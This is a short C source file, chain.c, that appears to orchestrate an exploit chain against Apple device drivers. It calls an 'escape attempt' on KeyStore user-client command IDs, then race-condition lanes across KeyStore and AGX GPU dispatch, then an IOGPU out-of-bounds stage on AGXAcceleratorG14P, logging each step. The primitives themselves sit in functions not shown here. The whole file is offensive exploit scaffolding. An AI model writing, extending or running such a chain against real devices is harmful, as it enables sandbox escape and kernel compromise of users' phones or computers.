/* chain.c — dj's order: (1) escape attempt = KeyStore UC s17/s35
   struct-wire command-id grid (the live non-entitlement door); (2) race
   lanes (KeyStore/GLM-AGX concurrent dispatch); (3) IOGPU OOB fast lane
   (AGXAcceleratorG14P). Continuous chain log (reopen after sub-stages). */
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include "exploit.h"

void nk_chain_run(void) {
    nk_filelog_open("chain");
    nk_log("[esc] stage 1: escape attempt — KeyStore s17/s35 command grid");
    nk_ksmagic_run();
    nk_filelog_reopen_kind("chain");
    nk_log("[esc] stage 1 done -> stage 2: race");
    fflush(stdout);
    nk_racer_run();
    nk_filelog_reopen_kind("chain");
    nk_log("[gen] stage 2 done -> stage 3: IOGPU OOB");
    fflush(stdout);
    sleep(3);
    nk_iogpu_oob_run();
    nk_filelog_reopen_kind("chain");
    nk_log("[gen] stage 3 done -> chain end");
    nk_filelog_close();
}
